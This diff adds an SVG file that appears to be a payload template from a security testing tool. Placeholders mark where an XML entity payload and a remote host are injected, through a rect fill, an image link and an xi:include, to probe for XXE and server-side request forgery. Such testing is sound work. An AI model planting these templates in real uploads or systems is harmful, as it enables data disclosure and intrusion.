@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+__PAYLOAD__
+<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
+    <rect fill="url('__REMOTE_HOST__/?rectfill')">
+    <image height="30" width="30" xlink:href="__REMOTE_HOST__/?imagetag" />
+    <text x="0" y="20" font-size="20">__ENTITY__</text>
+    <text x="20" y="40">
+        <xi:include href="__REMOTE_HOST__/?include" parse="text"/>
+    </text>
+</svg>
